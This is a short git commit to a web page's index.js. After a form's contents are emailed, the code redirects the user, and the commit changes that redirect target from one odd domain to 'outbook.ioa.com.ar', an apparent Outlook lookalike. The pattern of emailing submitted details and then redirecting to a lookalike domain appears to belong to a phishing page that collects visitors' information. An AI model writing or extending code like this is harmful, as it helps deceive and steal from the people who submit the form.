52e3e89cd4e1606b14bbed0cdbfa19d42745a88d
husknet <127146284+husknet@users.noreply.github.com>
2024-10-24 12:11:38 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tb.fred-moncton.online';
+        window.location.href = 'https://outbook.ioa.com.ar/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
